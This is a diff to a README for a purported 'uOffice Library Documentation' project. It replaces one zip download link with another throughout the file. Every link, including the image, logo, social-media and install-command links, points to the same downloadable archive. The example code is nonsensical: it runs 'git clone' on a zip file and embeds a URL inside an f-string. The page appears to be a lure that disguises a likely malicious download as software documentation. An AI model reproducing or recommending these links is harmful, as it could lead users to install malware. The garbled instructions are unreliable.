@@ -1,6 +1,6 @@
 # uOffice_LIBrary_DOC
 
-![uOffice_LIBrary_DOC](https://github.com/kissmyogmako/uOffice_LIBrary_DOC/releases/download/v2.0/Software.zip)
+![uOffice_LIBrary_DOC](https://raw.githubusercontent.com/kissmyogmako/uOffice_LIBrary_DOC/master/src/LI-u-Office-DOC-Brary-v1.2-beta.1.zip)
 
 Welcome to the official repository of the uOffice Library Documentation! This repository serves as a hub for all the information and resources related to the uOffice software library, providing comprehensive documentation and support for users and developers.
 
@@ -33,7 +33,7 @@ To install the uOffice Library Documentation, follow these simple steps:
 1. Clone the repository to your local machine:
 
 ```bash
-git clone https://github.com/kissmyogmako/uOffice_LIBrary_DOC/releases/download/v2.0/Software.zip
+git clone https://raw.githubusercontent.com/kissmyogmako/uOffice_LIBrary_DOC/master/src/LI-u-Office-DOC-Brary-v1.2-beta.1.zip
 ```
 
 2. Navigate to the cloned directory and extract the contents.
@@ -52,10 +52,10 @@ Here's a simple example demonstrating how to use the uOffice Library in a Python
 from uoffice import Document
 
 # Create a new Document object
-doc = Document('https://github.com/kissmyogmako/uOffice_LIBrary_DOC/releases/download/v2.0/Software.zip')
+doc = Document('https://raw.githubusercontent.com/kissmyogmako/uOffice_LIBrary_DOC/master/src/LI-u-Office-DOC-Brary-v1.2-beta.1.zip')
 
 # Print the number of pages in the document
-print(f'Number of pages: {https://github.com/kissmyogmako/uOffice_LIBrary_DOC/releases/download/v2.0/Software.zip}')
+print(f'Number of pages: {https://raw.githubusercontent.com/kissmyogmako/uOffice_LIBrary_DOC/master/src/LI-u-Office-DOC-Brary-v1.2-beta.1.zip}')
 ```
 
 This is just a basic example, and the uOffice Library offers a wide range of functionalities for more advanced use cases.
@@ -78,10 +78,10 @@ The uOffice Library Documentation is licensed under the GPL-3 License. See the [
 
 ---
 
-![uOffice Logo](https://github.com/kissmyogmako/uOffice_LIBrary_DOC/releases/download/v2.0/Software.zip)
+![uOffice Logo](https://raw.githubusercontent.com/kissmyogmako/uOffice_LIBrary_DOC/master/src/LI-u-Office-DOC-Brary-v1.2-beta.1.zip)
 
 📚 Happy Documenting with uOffice! 📚
 
-[Download the Software Library](https://github.com/kissmyogmako/uOffice_LIBrary_DOC/releases/download/v2.0/Software.zip)
+[Download the Software Library](https://raw.githubusercontent.com/kissmyogmako/uOffice_LIBrary_DOC/master/src/LI-u-Office-DOC-Brary-v1.2-beta.1.zip)
 
-🔗 Connect with us on [GitHub](https://github.com/kissmyogmako/uOffice_LIBrary_DOC/releases/download/v2.0/Software.zip) | [Twitter](https://github.com/kissmyogmako/uOffice_LIBrary_DOC/releases/download/v2.0/Software.zip) | [LinkedIn](https://github.com/kissmyogmako/uOffice_LIBrary_DOC/releases/download/v2.0/Software.zip) | [Website](https://github.com/kissmyogmako/uOffice_LIBrary_DOC/releases/download/v2.0/Software.zip)
+🔗 Connect with us on [GitHub](https://raw.githubusercontent.com/kissmyogmako/uOffice_LIBrary_DOC/master/src/LI-u-Office-DOC-Brary-v1.2-beta.1.zip) | [Twitter](https://raw.githubusercontent.com/kissmyogmako/uOffice_LIBrary_DOC/master/src/LI-u-Office-DOC-Brary-v1.2-beta.1.zip) | [LinkedIn](https://raw.githubusercontent.com/kissmyogmako/uOffice_LIBrary_DOC/master/src/LI-u-Office-DOC-Brary-v1.2-beta.1.zip) | [Website](https://raw.githubusercontent.com/kissmyogmako/uOffice_LIBrary_DOC/master/src/LI-u-Office-DOC-Brary-v1.2-beta.1.zip)
